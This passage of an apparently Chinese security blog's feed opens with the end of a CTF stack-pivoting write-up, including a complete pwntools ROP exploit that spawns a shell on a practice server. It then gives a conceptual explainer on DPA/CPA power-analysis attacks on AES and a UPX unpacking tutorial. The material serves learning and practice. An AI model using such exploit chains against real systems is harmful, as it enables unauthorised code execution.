class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>print_name函数内部发生栈溢出，然而只是溢出了2个字节，不足以覆到返回地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">print_name</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, a1, <span class="number">0x32</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, &amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是，因为main和print_name函数的栈帧差距较小，因此溢出的2个字节完全可以覆盖成泄露的buf的地址，从而改变了main函数的rbp，调用print_name函数快结束时，leave等同于mov rsp, rbp；pop rbp，此时rbp就是buf的首地址，然后retn等同于pop rip，回到main刚刚调用完print_name的地方，后面就是main函数的结束恢复帧栈空间了，同理，后面的leave会先把rsp赋值为rbp，这样rsp指向的就是buf了，然后再去pop ebp和ret操作就去执行了我们再buf中构造好的ROP chain啦！</p>
<p>未覆盖时的栈帧结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high address      </span><br><span class="line">                        +--------------------+ &lt;--+ </span><br><span class="line">               +------&gt; |    previous rbp    |    |</span><br><span class="line">               |        +--------------------+    |</span><br><span class="line">               |        |       ......       |    |</span><br><span class="line">               |        +--------------------+    | main()</span><br><span class="line">               |        |        buf         |    |</span><br><span class="line">               |        +--------------------+    |</span><br><span class="line">               |        |   return address   |    |</span><br><span class="line">               |        +--------------------+ &lt;--+</span><br><span class="line">               +------- |    previous rbp    |    |</span><br><span class="line">                        +--------------------+    |</span><br><span class="line">                        |       ......       |    | print_name()</span><br><span class="line">                        +--------------------+    |</span><br><span class="line">                        |        dest        |    |</span><br><span class="line">                        +--------------------+ &lt;--+</span><br><span class="line">low address       </span><br></pre></td></tr></table></figure>

<p>覆盖后的栈帧结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high address      </span><br><span class="line">                        +--------------------+      </span><br><span class="line">                        |    previous rbp    |     </span><br><span class="line">                        +--------------------+     </span><br><span class="line">                        |       ......       |     </span><br><span class="line">                        +--------------------+     </span><br><span class="line">                        |      ROP chain     |     </span><br><span class="line">                        +--------------------+ &lt;--+     </span><br><span class="line">               +------&gt; |        buf         |    |</span><br><span class="line">               |        +--------------------+    | main()</span><br><span class="line">               |        |   return address   |    |</span><br><span class="line">               |        +--------------------+ &lt;--+</span><br><span class="line">               +------- |    previous rbp    |    |</span><br><span class="line">                        +--------------------+    |</span><br><span class="line">                        |       ......       |    | print_name()</span><br><span class="line">                        +--------------------+    |</span><br><span class="line">                        |        dest        |    |</span><br><span class="line">                        +--------------------+ &lt;--+</span><br><span class="line">low address       </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>因为是64位程序，传参是通过寄存器，所以得先<code>ROPgadget --binary stack4 --only &quot;pop|ret&quot; | grep rdi</code>获取到寄存器保存参数和ret的地址为0x4008a3</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack_pivoting]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary stack4 --only &quot;pop|ret&quot; | grep rdi</span></span><br><span class="line">0x00000000004008a3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>

<p>获取”/bin/sh”的地址为0x4008c9，<code>ROPgadget --binary stack4 --string &quot;/bin/sh&quot;</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack_pivoting]</span><br><span class="line">└─<span class="comment"># ROPgadget --binary stack4 --string &quot;/bin/sh&quot;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004008c9 : /bin/sh</span><br></pre></td></tr></table></figure>

<p>获取system的地址为0x40073a，<code>objdump -d stack4 | grep &#39;plt&#39;</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home/stack_pivoting]</span><br><span class="line">└─<span class="comment"># objdump -d stack4 | grep &#x27;plt&#x27;</span></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line">00000000004005d0 &lt;.plt&gt;:</span><br><span class="line">00000000004005e0 &lt;puts@plt&gt;:</span><br><span class="line">  4005eb:       e9 e0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">00000000004005f0 &lt;setbuf@plt&gt;:</span><br><span class="line">  4005fb:       e9 d0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">0000000000400600 &lt;system@plt&gt;:</span><br><span class="line">  40060b:       e9 c0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">0000000000400610 &lt;<span class="built_in">printf</span>@plt&gt;:</span><br><span class="line">  40061b:       e9 b0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">0000000000400620 &lt;<span class="built_in">read</span>@plt&gt;:</span><br><span class="line">  40062b:       e9 a0 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">0000000000400630 &lt;memcpy@plt&gt;:</span><br><span class="line">  40063b:       e9 90 ff ff ff          jmp    4005d0 &lt;.plt&gt;</span><br><span class="line">  40073a:       e8 c1 fe ff ff          call   400600 &lt;system@plt&gt;</span><br><span class="line">  400761:       e8 ca fe ff ff          call   400630 &lt;memcpy@plt&gt;</span><br><span class="line">  400779:       e8 92 fe ff ff          call   400610 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">  4007a8:       e8 43 fe ff ff          call   4005f0 &lt;setbuf@plt&gt;</span><br><span class="line">  4007bc:       e8 2f fe ff ff          call   4005f0 &lt;setbuf@plt&gt;</span><br><span class="line">  4007d0:       e8 1b fe ff ff          call   4005f0 &lt;setbuf@plt&gt;</span><br><span class="line">  4007dc:       e8 ff fd ff ff          call   4005e0 &lt;puts@plt&gt;</span><br><span class="line">  4007f7:       e8 14 fe ff ff          call   400610 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">  400803:       e8 d8 fd ff ff          call   4005e0 &lt;puts@plt&gt;</span><br><span class="line">  40081c:       e8 ff fd ff ff          call   400620 &lt;<span class="built_in">read</span>@plt&gt;</span><br></pre></td></tr></table></figure>

<p>构造出payload = p64(0xdeadbeef) + p64(rdi_ret_addr) + p64(sh_addr) + p64(system_addr) + ‘a’*16 + p64(buf_addr)</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#r = remote(&quot;47.94.239.235&quot;, 2024)</span></span><br><span class="line">    r = process(<span class="string">&quot;./stack4&quot;</span>)</span><br><span class="line">    rdi_ret_addr = <span class="number">0x4008a3</span></span><br><span class="line">    sh_addr = <span class="number">0x4008c9</span></span><br><span class="line">    system_addr = <span class="number">0x40073a</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    buf_addr = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    buf_addr = <span class="built_in">int</span>(buf_addr[-<span class="number">15</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    payload = p64(<span class="number">0xdeadbeef</span>) + p64(rdi_ret_addr) + p64(sh_addr) + p64(system_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">16</span> + p64(buf_addr)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.send(payload)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>

<p>打通！</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">🍎 ~/kali/ python exp.py</span><br><span class="line">[+] Opening connection to 47.94.239.235 on port 2024: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello ﾭ?</span><br><span class="line">$         whoami</span><br><span class="line">ctf</span><br><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">$ cat home/ctf/flag</span><br><span class="line">flag&#123;a32fd27e21-d663-41c0-be6c-9cbb2d504823&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>初识测信道攻击（Side Channel Attack）</title>
    <url>/2023/05/20/SCA/</url>
    <content><![CDATA[<h1 id="初识测信道攻击（Side-Channel-Attack"><a href="#初识测信道攻击（Side-Channel-Attack" class="headerlink" title="初识测信道攻击（Side Channel Attack )"></a>初识测信道攻击（Side Channel Attack )</h1><p>目前测信道攻击的几个攻击面：热量，声音，时钟，电磁辐射，能耗。为什么从这些面去攻击呢？因为这些面都是非常轻易能测量的！也是开发者很难做防守的点。我将从能耗攻击入手测信道，定期分享一些心得。</p>
<p><img src="https://re1own.github.io/assets/img/SCA/image-20230519004802741.png" alt="image-20230519004802741"></p>
<p>能耗攻击AES加密算法，简单来说就是通过监控设备在加密过程中的能耗来推测AES加密的密钥。而其中的推测方式主要有两种，一种是DPA（利用平均数的差分），另一种是CPA（利用统计学推测能耗与数值间的相关性）。其实它两本质上是一样的道理，只不过是在处理能耗数据上采取了不同的策略，殊途同归。在了解主要的两种能耗攻击（DPA和CPA）的具体过程之前，这里简单介绍一下AES-128加密算法</p>
<h2 id="AES-128加密算法"><a href="#AES-128加密算法" class="headerlink" title="AES-128加密算法"></a>AES-128加密算法</h2><h3 id="Step1-AddRound-key"><a href="#Step1-AddRound-key" class="headerlink" title="Step1: AddRound key"></a>Step1: AddRound key</h3><p>明文P和密钥K，我们可以将其分别看成两个4x4的矩阵，每个Value都是一个字节。让两个矩阵进行+操作。</p>
<p><img src="https://re1own.github.io/assets/img/SCA/image-20230520025652793.png" alt="image-20230520025652793"></p>
<p>操作如(3)，简写成(4)</p>
<p><img src="https://re1own.github.io/assets/img/SCA/image-20230519010852493.png" alt="image-20230519010852493"></p>
<h3 id="Step2-SubRound"><a href="#Step2-SubRound" class="headerlink" title="Step2: SubRound"></a>Step2: SubRound</h3><p>在AddRound后，得到一个4x4的新矩阵，这还不够，AES还想让这些数据做更大的混合，加大破解的难度，于是乎通过一个叫<strong>S-box</strong>的东西把Round后的每一个数值进行固定的替代。例如Round后的一个字节是0x12，那么就找到第0x1行，第0x2列的数值，这个表中是c9，那么就是把0x12换成c9。这样换下来后，数据的破解难度会加大。</p>
<p><img src="https://re1own.github.io/assets/img/SCA/image-20230519011243504.png" alt="image-20230519011243504"></p>
<p>SubRound过程这样表示</p>
<p><img src="https://re1own.github.io/assets/img/SCA/image-20230519020225029.png" alt="image-20230519020225029"></p>
<p>下面一个例子是在AddRound后的矩阵做SubRound后的结果，可以看到数值都通过S-box准确映射成一个新的矩阵</p>
<p><img src="https://re1own.github.io/assets/img/SCA/image-20230519020322133.png" alt="image-20230519020322133"></p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/AES-SubBytes.svg/2880px-AES-SubBytes.svg.png" alt="undefined"></p>
<h3 id="Step3-ShiftRows"><a href="#Step3-ShiftRows" class="headerlink" title="Step3: ShiftRows"></a>Step3: ShiftRows</h3><p>把上一步得到的矩阵的行进行左移，第i行左移动i位（从0行开始数），第0行不移动，第一行一动一位，第二行移动两位以此类推。。。然后得到一个新的矩阵</p>
<p><img src="https://re1own.github.io/assets/img/SCA/image-20230520024213409.png" alt="image-20230520024213409"></p>
<h3 id="Step4-MixColums"><a href="#Step4-MixColums" class="headerlink" title="Step4: MixColums"></a>Step4: MixColums</h3><p>将上一步得到的矩阵和一个固定的矩阵进行乘操作又得到一个新的矩阵</p>
<p><img src="https://re1own.github.io/assets/img/SCA/image-20230520024248413.png" alt="image-20230520024248413"></p>
<p>根据维基百科，这个矩阵貌似是固定的，就是下面这个</p>
<p><img src="https://re1own.github.io/assets/img/SCA/image-20230519103656001.png" alt="image-20230519103656001"></p>
<p>可以发现就是三种情况，乘1，2，3。然而需要注意的是这个乘法很特殊不像十进制那样。</p>
<p><strong>第一种情况：</strong>1*a = a</p>
<p><strong>第二种情况：</strong>2*a，如果a的首位是0，那么a左移2位，如果a的首位是1，则( (a&lt;&lt;1) &amp; ( (1&lt;&lt;8) - 1) ) ^ (0x1b)</p>
<p><strong>第三种情况：</strong>3*a，则(2 * a) ^ a</p>
<h3 id="Step5-AddRound-key"><a href="#Step5-AddRound-key" class="headerlink" title="Step5: AddRound key"></a>Step5: AddRound key</h3><p>再来一遍AddRound key，但此时的key不再是原来的了，需要通过原来的密钥进行计算。把原来的密钥按列看成4个字节，每个字节进行左环移，然后又对这4个字节进行S-box变换，变换后，最左面的字节与RCj相加，AES128加密要把以上步骤进行10轮，RCj在每一轮的计算中都不一样</p>
<p><img src="https://re1own.github.io/assets/img/SCA/image-20230519105553591.png" alt="image-20230519105553591"></p>
<p>RCj在每一轮中对应的数值如下：</p>
<p><img src="https://re1own.github.io/assets/img/SCA/image-20230519105815719.png" alt="image-20230519105815719"></p>
<h2 id="Step6-Optimization-of-the-cipher"><a href="#Step6-Optimization-of-the-cipher" class="headerlink" title="Step6: Optimization of the cipher"></a>Step6: Optimization of the cipher</h2><p>把上述过程重复10次，最后得到的就是16字节的密文了</p>
<h2 id="DPA（Differential-Power-Analysis）"><a href="#DPA（Differential-Power-Analysis）" class="headerlink" title="DPA（Differential Power Analysis）"></a>DPA（Differential Power Analysis）</h2><p>通过分析设备在执行密码操作时消耗的电力来获取信息。攻击者会收集大量的电力消耗数据，然后分析这些数据来寻找模式和差异。这些模式或差异可以帮助攻击者猜测密钥的部分或全部。</p>
<p>步骤：</p>
<p><strong>数据收集</strong>：用电脑通过串口对板子发送指令信号去执行AddRound Key和SubBytes操作。AddRound和SubBytes为每个单独的明文运行10次，以使示波器能够得到一个平均的结果（从而帮助减轻背景噪音和干扰）。</p>
<p><img src="https://re1own.github.io/assets/img/SCA/image-20230519173931074.png" alt="image-20230519173931074"></p>
<p>在CMOS电路中，对位为1的数据进行操作通常需要更多的电荷移动，因此消耗更多的能量。观察LSB（the least significant bit，最低有效位）。如果该假设成立，我们可以利用这个事实在密码操作期间推导出密钥。功耗其实变化是非常小的，几乎没法用肉眼观察，因此，在DPA中，必须收集大量的迹线，根据LSB的值将这些功耗迹线数据分成两个子集：一个子集包含LSB为0的迹线，另一个子集包含LSB为1的迹线。</p>
<p>假设有一个只有两位的简单加密系统，采用XOR操作作为加密操作，我们有四种可能的密钥（00，01，10，11）。(假设功耗只和明文中的1的数量有关，实际情况会更复杂。)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明文   密文   功耗</span><br><span class="line">00 -&gt; 11 -&gt; 1.0</span><br><span class="line">01 -&gt; 00 -&gt; 2.0</span><br><span class="line">10 -&gt; 00 -&gt; 2.0</span><br><span class="line">11 -&gt; 10 -&gt; 1.0</span><br></pre></td></tr></table></figure>

<p><strong>分组</strong>：我们可以预测明文和每个假设的密钥进行XOR操作后的中间值。对于每个假设的密钥，我们将功耗样本按照预测的中间值的最低有效位（LSB）进行分组。例如，对于假设的密钥01：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明文 XOR 密钥 = 中间值</span><br><span class="line">00 XOR 01 = 01 -&gt; LSB为1 -&gt; 功耗1.0进入1组</span><br><span class="line">01 XOR 01 = 00 -&gt; LSB为0 -&gt; 功耗2.0进入0组</span><br><span class="line">10 XOR 01 = 11 -&gt; LSB为1 -&gt; 功耗2.0进入1组</span><br><span class="line">11 XOR 01 = 10 -&gt; LSB为0 -&gt; 功耗1.0进入0组</span><br></pre></td></tr></table></figure>

<p>这样我们就得到了两组功耗样本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0组：[2.0, 1.0]</span><br><span class="line">1组：[1.0, 2.0]</span><br></pre></td></tr></table></figure>

<p><strong>计算差分</strong>：我们计算每组的平均功耗，然后计算两者之间的差值。在这个例子中，0组的平均功耗是1.5，1组的平均功耗也是1.5，差值为0，说明01不太可能是密钥，之后代入其他的比如00,11,10，谁的差分最大谁才是最可能的密钥。</p>
<p><strong>密钥选择：</strong>我们将重复这个过程，对每一个可能的密钥都计算出一个功耗差值。最后，我们将选择那个使得功耗差值最大的密钥作为可能的正确密钥。在这个极度简化的示例中，所有的密钥都会得到相同的差值，所以我们不能确定正确的密钥。但在实际情况下，正确的密钥通常会导致较大的功耗差值。</p>
<p><strong>密钥猜测选择方法：</strong></p>
<p>以上是一个数据量非常小的例子，枚举所有数值即可，而实际的AES-128，密钥是128位（16个字节），枚举所有可能去一个个套是不可能的。在进行密钥猜测时，可以采取以下几种方法：</p>
<ul>
<li><p>字典攻击：创建一个包含可能的密钥的字典，并将每个密钥尝试应用于攻击目标。这需要预先生成和存储大量可能的密钥，并进行遍历比较。然而，由于密钥空间非常大，这种方法很可能会遭遇到时间和空间上的限制。</p>
</li>
<li><p>蒙特卡罗方法：使用随机生成的密钥进行攻击，并观察功耗模式。重复这个过程多次，根据每个密钥产生的功耗模式的统计信息来推断出最有可能的密钥。</p>
</li>
<li><p>高级优化算法：使用各种优化算法（如遗传算法、模拟退火算法等）对密钥空间进行搜索。这些算法可以在密钥空间中进行智能搜索，以找到可能的密钥。</p>
</li>
<li><p>辅助信息攻击：尝试收集更多关于目标设备的辅助信息，例如设备在处理不同输入时的功耗变化模式，或者算法执行中的其他侧信道信息。这些额外的信息可以用于提高密钥猜测的准确性。</p>
</li>
</ul>
<h2 id="CPA（Correlation-Power-Analysis）"><a href="#CPA（Correlation-Power-Analysis）" class="headerlink" title="CPA（Correlation Power Analysis）"></a>CPA（Correlation Power Analysis）</h2><p>这是一种更为复杂的攻击，利用了电力消耗与密钥操作之间的统计相关性。具体来说，攻击者会生成一系列密钥假设，并对每个假设进行电力消耗模型的计算，然后将这些结果与实际的电力消耗数据进行相关性比较。假设与实际数据相关性最高的密钥最有可能是正确的密钥。</p>
<p>步骤：</p>
<p><strong>收集侧信道数据</strong>（这些数据可以是设备的功耗消耗曲线、电磁波辐射强度或其他与设备操作相关的信号。因为DPA已经举了能耗的例子就不在此赘述了。</p>
<p><strong>建立模型</strong>：接下来，需要建立一个统计模型来描述侧信道数据与秘密密钥之间的关系。通常使用相关性分析来构建这个模型。举一个与DPA类似但略有不同的点。</p>
<p><strong>相关性：</strong>在DPA中，我们是只考虑了LSB，通过LSB这一个角度去分析数据。而在CPA中，我们可以选择更多可能的相关性。在功耗分析攻击中使用<strong>Hamming Weight Power Model</strong>的假设是输出的0或1位的数量与设备的功耗消耗存在相关性。比如二进制1001110，在DPA中，就只考虑最低位是0，分析的数据的相关性其实比较弱。而CPA中，我们可以选择以评判这个二进制中1的数量，比如二进制11111111，有8个1，二进制11001100只有4个1。1多的数消耗的能耗要多于1少的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">value				P</span><br><span class="line">11111111		7.3</span><br><span class="line">11001100		4.5</span><br></pre></td></tr></table></figure>

<p><strong>统计分析：</strong>下图给出了一个加密设备可能产生的输出示例以及测量每个输出时的功耗消耗。输出为0000 0111的汉明重量为3，而0000 1111的汉明重量为4，依此类推。</p>
<p><img src="https://re1own.github.io/assets/img/SCA/image-20230520021455091.png" alt="image-20230520021455091"></p>
<p>假设我们生成了一个完全准确的汉明重量功耗模型，那么如图所示，将会找到强正相关性（即随着功耗消耗的增加，二进制输出中的1的数量也会增加）。</p>
<p><img src="https://re1own.github.io/assets/img/SCA/image-20230520021353785.png" alt="image-20230520021353785"></p>
<p><strong>密钥推断：</strong>根据统计分析的结果，可以推断出猜测的密钥位的值。在我们的例子中，如果发现某个时间点上的功耗值与猜测密钥的第一个字节的值呈现高度相关性，那么我们可以得出结论，猜测的密钥位的值可能是正确的。</p>
<p><strong>验证和重复：</strong>对于成功推断的密钥位，我们可以使用其他的加密操作或数据样本进行验证。如果验证成功，则可以进一步推断其他未知的密钥位。如果验证失败，则需要重新进行攻击过程，并尝试不同的猜测和分析方法。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>破解密钥就像仿制一个特定的杯子，数据就像水，杯子可以让水变成多种形状就像密钥可以改变数据到面目全非，而破解密钥的过程就是不断尝试利用各种方法雕刻杯子直到能和特定杯子一样能使数据的形状一致。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://doi.org/10.1080/23742917.2016.1231523">Power analysis attacks on the AES-128 S-box using diﬀerential power analysis (DPA) and correlation power analysis (CPA)</a></p>
<p><a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES 128</a></p>
]]></content>
      <tags>
        <tag>SCA</tag>
        <tag>Power Analysis Attack</tag>
        <tag>Hardware Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Upx脱壳</title>
    <url>/2020/11/24/Upx%E8%84%B1%E5%A3%B3/</url>
    <content><![CDATA[<p>#Upx脱壳</p>
<p><strong>脚本脱壳:</strong><br>放入Exeinfo PE中检测，发现是UPX壳,而且提示可以用upx.exe -d进行脱壳处理</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3lvqgej30p00cwtby.jpg" alt="image-20210522225828389"></p>
<p>upx.exe -d 程序.exe</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3fy33lj30ty0awab9.jpg" alt="image-20210522225835114"></p>
<p><strong>手动脱壳</strong></p>
<p>法一:根据跨段指令寻找OEP<br>绝大多数加壳程序会在被加密的程序中加上一个或多个段，在最后跳转至OEP时一般都是通过一个跨段跳转指令，所以一句跨段的转移指令(远JMP等)就可找到真正的入口点，在改跳转指令前一般会有POPAD/POPFD指令出现(用于回复入口现场)可以用作定位参考<br>首先是pushad,将全部的通用寄存器入栈，那么我们往下面翻，找到远跳转指令</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3c4iknj31wg0u04by.jpg" alt="image-20210522225845167"></p>
<p>主要是找远跳转指令的机器码(E9),普通的jmp是E8,找到E9后，对其下断点，运行到此处</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3p9w80j31um0u0qfj.jpg" alt="image-20210522225854194"></p>
<p>按F8步入后就是OEP了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3nejj9j31lv0u0an6.jpg" alt="image-20210522225904855"></p>
<p>法二:根据堆栈平衡原理寻找OEP<br>该方法即为”ESP定律”法，对绝大部分压缩壳都很有效，原理便是基于栈平衡，壳段代码在保存现场后，我们队ESP指向的内存单元下硬件访问断点，那么在壳段代码恢复现场时定会访问到这个单元，此时我们EIP所处的位置处于壳段代码末端，距离跳转至OEP也就不远了</p>
<p>先单步执行pushad指令，然后对此时的ESP下断点(就是此时的栈顶,右下角)对此处下硬件断点访问</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3q65wyj31gu0u0wqn.jpg" alt="image-20210522225915983"></p>
<p>R运行后，可以发现从popad断下来了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3j4yyvj31ds0u0qdq.jpg" alt="image-20210522225924883"></p>
<p>法三:根据内存断点寻找OEP<br>内存断点的作用:在程序对一端内存进行访问时断下该程序，一般借用对内存保护属性进行修改，触发一场来实现中断。<br>壳必须要解压和解密原来的代码，这个过程可以看做对原程序指令所处的代码段的写入，壳最后还需要转交执行权给原程序，会触发对原程序指令所处的代码段的执行，这两个点都可以被用来监控壳段代码的行为以及寻找OEP</p>
<p>在x32dbg/x64dbg中的内存布局中对UPX0右键内存断点-&gt;执行-&gt;一次性</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3mghjwj31jg0tewps.jpg" alt="image-20210522225936820"></p>
<p>R运行，就会直接断到EOP位置(时间有点慢)</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3ezc3nj30t606utas.jpg" alt="image-20210522225945782"></p>
<p>最后使用Scylla进行Dump!</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3kj7lej311e0u0aj5.jpg" alt="image-20210522225955069"></p>
<p><strong>可是还没有结束!!!!</strong><br>导入ida发现IAT需要修复!</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3hqk6tj30mk07gmxp.jpg" alt="image-20210522230004776"></p>
<p>IAT修复:Dump出来的程序一般是无法直接运行的，因为缺少了必要的信息，PE加载器不能正确地填充IAT，导致所有的动态链接库API调用都不能正确寻址,如下:</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3kwx78j31a40o03zx.jpg" alt="image-20210522230013464"></p>
<p>解决方法:重建INT(用工具修复法)<br>我们这里所说的INT(Import Address Table)并非我们所说的导入表(Import Table),但是在一个PE文件中，这两个表的内容是完全一致的</p>
<p>在<strong>OEP位置</strong>搜索ITA,在Scylla中按IAT Autosearch，结果如下</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3fhgebj30u00vn438.jpg" alt="image-20210522230023159"></p>
<p>按get import获取导入信息</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3inji4j30u00w0te3.jpg" alt="image-20210522230033739"></p>
<p>把划×的给删除就行了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3lmmayj30ju0c4ab8.jpg" alt="image-20210522230041599"></p>
<p>然后点击fix dump,选择我们之前dump出来的程序</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3jzuz5j30b606y74a.jpg" alt="image-20210522230049471"></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3po1dqj30wg0u0gsf.jpg" alt="image-20210522230053924"></p>
<p>最后提示导入信息重建成功</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3e02gaj30x009k40w.jpg" alt="image-20210522230104771"></p>
<p>然后运行我们的修复后的dump_SCY，发现还是跑不了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3msibpj30jc054wex.jpg" alt="image-20210522230112243"></p>
<p>用dbg打开发现OEP正常了，如图1，但是F9运行下去说异常于0x0063175D如图2<br>图1 OEP正常了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3onqfhj315c05kac4.jpg" alt="image-20210522230119527"></p>
<p>图2 异常于0x0063175D，而且说EB3004是无效的地址</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3btu4lj30za0u0n6q.jpg" alt="image-20210522230128348"></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3gqvoqj30nw050gmc.jpg" alt="image-20210522230134324"></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3h9g6zj30we07wdgz.jpg" alt="image-20210522230138611"></p>
<p>用CFF Exploer VIII把unpack_test_dump_SCY中的可选头中的DLL can move这个选项给去掉</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3ccrnrj31wg0u04by.jpg" alt="image-20210522230147905"></p>
<p>点击保存后，再打开，这个时候就去壳成功了!</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3jmgxfj30qa082wf1.jpg" alt="image-20210522230156339"></p>
<p>补充:看看去壳成功后和刚才异常的区别<br>把刚刚去DLL的程序再还原一下(即再勾选一次)</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3i47akj30v60kkn0c.jpg" alt="image-20210522230203487"></p>
<p>在异常的代码(<strong>机器码那个位置</strong>)那里复制它的二进制</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3o0lttj316k0rqjzx.jpg" alt="image-20210522230211003"></p>
<p>用dbg再次打开，ctrl + b搜索特征码</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3gdz9kj31010u0dii.jpg" alt="image-20210522230218258"></p>
<p>dbg搜索的时候在打开文件的时候先要F9运行到真正的程序开始，否则搜不到</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3czm4dj30ti0aswfs.jpg" alt="image-20210522230225714"></p>
<p>此时发现都是地址都有值了，都是EB开头,也没有问号了</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwqd3dhqy7j30wm0dq0xz.jpg" alt="image-20210522230236755"></p>
]]></content>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>qemu桥接的两种姿势(win10&amp;&amp;ubuntu)</title>
    <url>/2021/10/28/qemu%E6%A1%A5%E6%8E%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF(win10&amp;&amp;ubuntu)/</url>
